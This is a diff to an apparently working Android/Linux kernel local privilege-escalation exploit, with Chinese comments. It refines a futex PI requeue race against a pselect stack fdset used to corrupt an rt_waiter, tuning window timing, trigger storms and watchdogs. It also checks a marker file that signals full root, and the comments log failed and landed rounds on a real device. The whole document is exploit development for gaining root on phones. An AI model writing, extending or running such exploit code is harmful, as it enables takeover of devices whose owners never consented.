@@ -45,6 +45,61 @@ static uint64_t slide_canary_magic;
 static int slide_canary_gword = -1;  /* -1 = 未布设 */
 static int slide_canary_hits;
 
+/* mt66: 窗口/风暴生命周期对账 (2026-08-30 四卡 15 轮尸检).
+ * 根因: mt61 把窗口 2s→20s 但看门狗仍是 mt59 时代死值 12s — waiter
+ * 3s 醒 + 20s 窗 = 窗口要到 requeue+23s 才关, 看门狗 12s 就 _exit(3)
+ * → 每一轮 (赢/输) 都死在窗口中段, rc=3 全员 (R11_RC=3+R_LANDED 同现
+ * 之谜即此)。consumer 被负载饿 9s (1min load 35~215, 小核 CONSUMER_CORE
+ * 被 MIUI 后台压满; 未 pin 的 mt33 child 轮询照常跑 = 非全局死) 后
+ * calls=1 存进但 mt19b 永不打印 — 风暴 0 发, 13/18 轮如此。修法三件:
+ * (a) 看门狗 = wake+window+5 (env PSELECT_WATCHDOG_SECONDS 覆盖);
+ * (b) 风暴打完即 arm timerfd 收窗 (省 ~16s/轮, 且不再泊满窗口);
+ * (c) 发间窗口存活守卫 (go=0 即弃打, 防 post-window 杂散写 — pselect
+ *     返回后 fdset 内核副本已释放, 迟到触发 = 盲写)。
+ * 另: mt57 canary 埋点移到 open_slide_selected_fds 之前 (R6 尸检的
+ * EBADF 根因 = 埋在 dup 之后, canary 位 fd 未开 → pselect 秒退; 字段
+ * 仍默认关闭, 待 mt66 基线干净后下一卡再开)。 */
+static int slide_window_wake_fd = -1;   /* timerfd: 风暴收尾收窗用 */
+static int64_t slide_window_open_ms = -1; /* 窗口开启时刻 (CLOCK_MONOTONIC) */
+static int slide_trigger_shots = 6;     /* mt25 发数, PSELECT_TRIGGER_SHOTS */
+
+static int64_t slide_monotonic_ms(void) {
+  struct timespec ts;
+  clock_gettime(CLOCK_MONOTONIC, &ts);
+  return (int64_t)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
+}
+
+/* 窗口相对时戳: 诊断行统一带 t=NNNms, 直接量出 consumer 迟到量 */
+static int64_t slide_tdelta_ms(void) {
+  if (slide_window_open_ms < 0) {
+    return -1;
+  }
+  return slide_monotonic_ms() - slide_window_open_ms;
+}
+
+static long slide_env_long(const char *name, long dflt, long minv) {
+  char *e = getenv(name);
+  if (!e) {
+    return dflt;
+  }
+  long v = strtol(e, NULL, 0);
+  return (v >= minv) ? v : dflt;
+}
+
+static long slide_window_secs(void) {
+  return slide_env_long("PSELECT_WINDOW_SECONDS", 20, 1);
+}
+
+static long slide_wake_secs(void) {
+  return slide_env_long("PSELECT_WAITER_WAKE_SECONDS", 3, 1);
+}
+
+/* mt66(a): 看门狗必须比窗口活得久, 否则窗口后半段结构性不存在 */
+static long slide_watchdog_secs(void) {
+  return slide_env_long("PSELECT_WATCHDOG_SECONDS",
+                        slide_wake_secs() + slide_window_secs() + 5, 1);
+}
+
 int slide_pselect_words_per_set(void) {
   int bits_per_word = (int)(8 * sizeof(unsigned long));
   return (SLIDE_PSELECT_NFDS + bits_per_word - 1) / bits_per_word;
@@ -223,12 +278,15 @@ void slide_pselect_stack_copy(void) {
   fd_set out;
   fd_set ex;
   prepare_slide_pselect_fdsets(&in, &out, &ex);
-  open_slide_selected_fds(&in, &out, &ex, high_read);
 
-  /* mt57: 布设 canary + 发布 fdset 指针 (consumer 发间读回用)。
+  /* mt57/mt66: 布设 canary + 发布 fdset 指针 (consumer 发间读回用)。
    * 发布严格先于 consume_go=1 (下方), consumer 只在 go=1 后进触发循环
    * → 时序安全。canary 位 = ex 末词: pselect 只读 ceil(nfds/64) 词,
-   * 内核永不触碰; 几何词默认聚在 shift 邻域 (低位词), 不占此位。 */
+   * 内核永不触碰; 几何词默认聚在 shift 邻域 (低位词), 不占此位。
+   * mt66 顺序修复 (R6 尸检根因): 原来埋在 open_slide_selected_fds 之后
+   * → canary 位对应 fd 从未被 dup → do_select EBADF 秒退, 窗口 0s,
+   * R5/R6 两卡 0 发即此。现在先埋再 open, canary 位 fd 一并 dup 到
+   * timerfd。字段仍默认关 (PSELECT_NO_CANARY), 待 mt66 基线后开。 */
   slide_fdset_in = &in;
   slide_fdset_out = &out;
   slide_fdset_ex = &ex;
@@ -247,6 +305,7 @@ void slide_pselect_stack_copy(void) {
       pr_warning("mt57: canary position unavailable - self-check disabled\n");
     }
   }
+  open_slide_selected_fds(&in, &out, &ex, high_read);
 
   atomic_store(&slide_consume_stop, 0);
   atomic_store(&slide_consume_go, 0);
@@ -267,20 +326,25 @@ void slide_pselect_stack_copy(void) {
    * erase 从未在 fdset 帧存活期间发生 = 写结构上不可能。R9 排除"内核
    * 卡死" (sched ret=0 秒回, 只是迟到); A1_1 WIN 轮窗口 held 满整个
    * harness 时长 = 长窗口与胜利形态兼容。fdset 帧在 waiter 私有内核栈,
-   * 无跨任务暴露面。PSELECT_WINDOW_SECONDS 覆盖 (>=1)。 */
-  long mt61_window_secs = 20;
-  char *mt61_window_env = getenv("PSELECT_WINDOW_SECONDS");
-  if (mt61_window_env) {
-    long mt61_parsed = strtol(mt61_window_env, NULL, 0);
-    if (mt61_parsed >= 1) mt61_window_secs = mt61_parsed;
+   * 无跨任务暴露面。PSELECT_WINDOW_SECONDS 覆盖 (>=1)。
+   * mt66: 行扩为 watchdog+shots 联合行 (SIG_GREP 前缀不变); 看门狗
+   * 不再是 12s 死值 — 见 slide_watchdog_secs()。 */
+  long mt61_window_secs = slide_window_secs();
+  long mt66_watchdog_secs = slide_watchdog_secs();
+  slide_trigger_shots = (int)slide_env_long("PSELECT_TRIGGER_SHOTS", 6, 1);
+  if (slide_trigger_shots > 16) {
+    slide_trigger_shots = 16;
   }
+  slide_window_wake_fd = block_fd; /* mt66(b): 风暴收尾收窗 */
+  slide_window_open_ms = slide_monotonic_ms();
   struct timespec timeout = {
     .tv_sec = mt61_window_secs,
     .tv_nsec = 0,
   };
   struct timespec *timeoutp = &timeout;
-  pr_info("mt61: pselect window=%lds (mt60 时代为 2s 死值)\n",
-          mt61_window_secs);
+  pr_info("mt61: pselect window=%lds (mt60 时代为 2s 死值) "
+          "mt66: watchdog=%lds shots=%d t=0ms\n",
+          mt61_window_secs, mt66_watchdog_secs, slide_trigger_shots);
   fflush(stdout);
 
   atomic_store(&slide_consume_go, 1);
@@ -289,12 +353,14 @@ void slide_pselect_stack_copy(void) {
   int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);
   int saved_errno = errno;
   atomic_store(&slide_consume_go, 0);
+  slide_window_wake_fd = -1;
   pr_info("slide pselect returned ret=%d errno=%d calls=%d sched_ok=%d "
-          "last_sched_ret=%d last_sched_errno=%d\n",
+          "last_sched_ret=%d last_sched_errno=%d t=%lldms\n",
           ret, saved_errno, atomic_load(&slide_consume_calls),
           atomic_load(&slide_consume_sched_ok),
           atomic_load(&slide_consume_last_sched_ret),
-          atomic_load(&slide_consume_last_sched_errno));
+          atomic_load(&slide_consume_last_sched_errno),
+          (long long)slide_tdelta_ms());
 
   close(high_read);
   if (block_fd != pipefd[0]) {
@@ -313,7 +379,11 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
     int seq = atomic_load(&slide_consume_go);
     if (seq == 0 || seq == seen) {
       __asm__ volatile("yield" ::: "memory");
-      if (atomic_load(&slide_consume_stop)) {
+      /* mt66: 窗口已死 (stop 或 route_done) 直接收工 — 不再 yield 空转
+       * 占小核 (mt61 时代进程 12s 即死无所谓, 看门狗放宽后空转会占满
+       * 20s+)。 */
+      if (atomic_load(&slide_consume_stop) ||
+          atomic_load(&slide_route_done)) {
         return NULL;
       }
       continue;
@@ -337,6 +407,17 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
     if (seq == 1) {
       usleep(PSELECT_ENTER_DELAY_USEC);
     }
+    /* mt66(c): ENTER_DELAY 睡醒后窗口可能已自然关闭 (consumer 被负载
+     * 饿出整个窗口 = 2026-08-30 13/18 轮的形态) — 迟到开火 = fdset 内核
+     * 副本已释放后的盲走盲写, 弃打。 */
+    if (!atomic_load(&slide_consume_go)) {
+      pr_warning("mt66: consumer woke AFTER window close - skip burst "
+                 "(starved out of window, lost=%d)\n",
+                 atomic_load(&slide_consume_lost));
+      fflush(stdout);
+      atomic_store(&slide_consume_stop, 1);
+      continue;
+    }
 
     /* mt19b: try owner then waiter, up to 5 attempts; log every result */
     int calls = atomic_load(&slide_consume_calls);
@@ -356,8 +437,8 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
       errno = 0;
       ret = sched_setattr_tid(tid, ((calls + a) % 19) + 1);
       saved_errno = errno;
-      pr_info("mt19b: sched attempt=%d tid=%d ret=%ld errno=%d\n",
-              a, tid, ret, saved_errno);
+      pr_info("mt19b: sched attempt=%d tid=%d ret=%ld errno=%d t=%lldms\n",
+              a, tid, ret, saved_errno, (long long)slide_tdelta_ms());
       fflush(stdout);
       if (ret == 0) {
         best_ret = 0;
@@ -372,9 +453,18 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
     atomic_store(&slide_consume_last_sched_ret, best_ret);
     atomic_store(&slide_consume_last_sched_errno, best_errno);
     /* mt25: futex 触发加爆 — pselect 窗口内连发多发 (每次 50ms 阻塞 = 一次 walk 机会),
-     * 间隔 20ms (JoinChang 循环思想; 原版只打一发, 命中率低) */
+     * 间隔 20ms (JoinChang 循环思想; 原版只打一发, 命中率低)。
+     * mt66: 发数 PSELECT_TRIGGER_SHOTS (默认 6, 上限 16)。 */
     int trig_hits = 0;
-    for (int ti = 0; ti < 6; ti++) {
+    for (int ti = 0; ti < slide_trigger_shots; ti++) {
+      /* mt66(c): 发间窗口存活守卫 — 迟到饿醒后窗口已关则弃打剩余发次
+       * (pselect 返回后 fdset 内核副本已释放, post-window 触发 = 杂散写)。 */
+      if (!atomic_load(&slide_consume_go)) {
+        pr_warning("mt66: window closed mid-burst - abort shots ti=%d "
+                   "t=%lldms\n", ti, (long long)slide_tdelta_ms());
+        fflush(stdout);
+        break;
+      }
       /* mt51: 发间落地检测 (补 CRASH_HEALTHY_ENV 暴露的裁定洞). 我的 crash#2
        * 裁定只覆盖了 RETRY>1 和 sched_setattr 时序, 漏了这里: 6 连发的后半程
        * 仍对可能已中毒的 f_pi_target 树做 FUTEX_LOCK_PI (waiter INSERT +
@@ -404,6 +494,18 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
             break;
           }
         }
+        /* mt66: C 轮盲打终止器 — mt64 把状态文件 chmod 000 致盲了 mt51
+         * (C 阶段前置 = real_cred 已满帽, CapEff 检查恒真 = 假阳性),
+         * C 轮从此无落地反馈。真·全 root 信号 = root_alive.txt: mt33
+         * child AND-gate (CapEff 满帽 && euid==0) 命中后 ~200ms 内写出
+         * (uid=0 绕 DAC, 不受 chmod 影响)。R 轮同样有效 (只在完整 root
+         * 时出现, cleangate/fire 开火前已 rm)。出现即弃打剩余发次。 */
+        if (access("/data/local/tmp/root_alive.txt", F_OK) == 0) {
+          pr_info("mt66: root_alive seen - FULL ROOT, abort shots ti=%d "
+                  "t=%lldms\n", ti, (long long)slide_tdelta_ms());
+          fflush(stdout);
+          break;
+        }
         int cfd = open("/data/local/tmp/mt49_child_status.txt", O_RDONLY);
         if (cfd >= 0) {
           char sbuf[256];
@@ -429,7 +531,8 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
       struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
       errno = 0;
       long fret = futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
-      pr_info("mt25: futex trigger %d ret=%ld errno=%d\n", ti, fret, errno);
+      pr_info("mt25: futex trigger %d ret=%ld errno=%d t=%lldms\n",
+              ti, fret, errno, (long long)slide_tdelta_ms());
       fflush(stdout);
       if (fret == 0) {
         /* mt53 (spec2): win 后默认不再 UNLOCK_PI。旧 UNLOCK 走
@@ -454,8 +557,24 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
       atomic_store(&slide_consume_sched_ok, sched_ok);
     }
     atomic_store(&slide_consume_stop, 1);
+    /* mt66(b): 风暴打完即收窗 — 窗口的唯一使命是让 fdset 内核副本
+     * (毒化的 rt_waiter 槽) 存活到风暴结束; 风暴既毕, 泊满剩余窗口
+     * 纯浪费 (~16s/轮)。timerfd 已 dup 到所有 in-set fd 上, arm 1ms
+     * 即可读 → pselect 立即返回 → route_done=1 → 主流程收尾。 */
+    if (slide_window_wake_fd >= 0 && atomic_load(&slide_consume_go)) {
+      struct itimerspec mt66_its;
+      memset(&mt66_its, 0, sizeof(mt66_its));
+      mt66_its.it_value.tv_nsec = 1000000;
+      errno = 0;
+      long mt66_wr = syscall(SYS_timerfd_settime, slide_window_wake_fd, 0,
+                             &mt66_its, NULL);
+      pr_info("mt66: window wake armed ret=%ld errno=%d "
+              "(storm done at t=%lldms)\n",
+              mt66_wr, errno, (long long)slide_tdelta_ms());
+      fflush(stdout);
+    }
     while (atomic_load(&slide_consume_go)) {
-      __asm__ volatile("yield" ::: "memory");
+      usleep(1000); /* mt66: 让出核 (原 yield 空转占小核 20s) */
     }
     return NULL;
   }
@@ -707,24 +826,33 @@ uint64_t slide_child_leak_stext(void) {
   }
   pr_info("mt59: requeue fired ret=%ld errno=%d\n", mt59_rq, errno);
 
-  /* mt59: 看门狗。合法路径 requeue→route_done ≤ pselect 超时 (2s) +
-   * 消费风暴数秒。>12s = 竞态输在别处 = 哑轮 — 快速弃轮 (rc=3) 而不是
-   * 泊到 harness 击杀。哑轮的树从未毒化 (无几何 fdset 无 trigger),
-   * waiter 的超时清理走的是普通未毒树路径, 安全。 */
+  /* mt59: 看门狗。合法路径 requeue→route_done ≤ waiter 醒 (3s) + pselect
+   * 窗口 (20s) + 收尾数秒。mt66(a) 修复: mt61 把窗口 2s→20s 后本处仍留
+   * 12s 死值 → 每轮 (赢/输) 都死在窗口中段 = 2026-08-30 全员 rc=3 之谜
+   * (R11_RC=3 与 R_LANDED 同现 = 写已落地但 pselect 未到 20s 超时,
+   * route_done 必为 0 — rc=3 在 mt61 几何下对输赢无区分度)。现在取
+   * slide_watchdog_secs() = wake+window+5 (PSELECT_WATCHDOG_SECONDS 覆盖)。
+   * 哑轮的树从未毒化 (无几何 fdset 无 trigger), waiter 的超时清理走的是
+   * 普通未毒树路径, 安全 — 多泊 16s 无新增暴露面。 */
   time_t mt59_t0 = time(NULL);
+  double mt66_wd_secs = (double)slide_watchdog_secs();
   while (!atomic_load(&slide_route_done)) {
-    if (difftime(time(NULL), mt59_t0) > 12.0) {
+    if (difftime(time(NULL), mt59_t0) > mt66_wd_secs) {
       /* mt60: 原 mt59 这里用 pr_error — 但 pr_error 宏 (utils.h) 内嵌
        * exit(-1), 打印后进程以 rc=255 退出, 后续 _exit(3) 是永不执行的
        * 死代码 (clang -O2 直接消除了 mt60 旗标串), "rc=3 安全自弃"从
        * mt59 交付起就是纸面语义, 实际 R4 = STALL 行 + exit(-1)/rc=255。
        * 现改为 pr_warning (纯打印) + 旗标转储 + 显式 flush + _exit(3),
        * rc=3 真正生效。 */
-      pr_warning("mt59: STALL route_done>12s - inert round (lost race), "
-                 "aborting rc=3\n");
+      pr_warning("mt59: STALL route_done>%.0fs - inert round (lost race), "
+                 "aborting rc=3\n", mt66_wd_secs);
+      /* mt66: enter_sched 补进旗标行 — calls=1+enter=1+无 mt19b = 饿死在
+       * sched 段 (12s→28s 修复的主形态); calls=1+enter=0 = 饿死在更早的
+       * 自旋/ENTER_DELAY 段; t= 直接量出 consumer 停摆时长。 */
       pr_info("mt60: STALL flags waiter_ready=%d waiter_waiting=%d "
               "owner_started=%d owner_armed=%d route_done=%d "
-              "consume_go=%d consume_calls=%d canary_hits=%d\n",
+              "consume_go=%d consume_calls=%d enter_sched=%d canary_hits=%d "
+              "t=%lldms\n",
               atomic_load(&slide_waiter_ready),
               atomic_load(&slide_waiter_waiting),
               atomic_load(&slide_owner_started),
@@ -732,7 +860,9 @@ uint64_t slide_child_leak_stext(void) {
               atomic_load(&slide_route_done),
               atomic_load(&slide_consume_go),
               atomic_load(&slide_consume_calls),
-              slide_canary_hits);
+              atomic_load(&slide_consume_enter_sched),
+              slide_canary_hits,
+              (long long)slide_tdelta_ms());
       fflush(stdout);
       fflush(stderr);
       _exit(3);
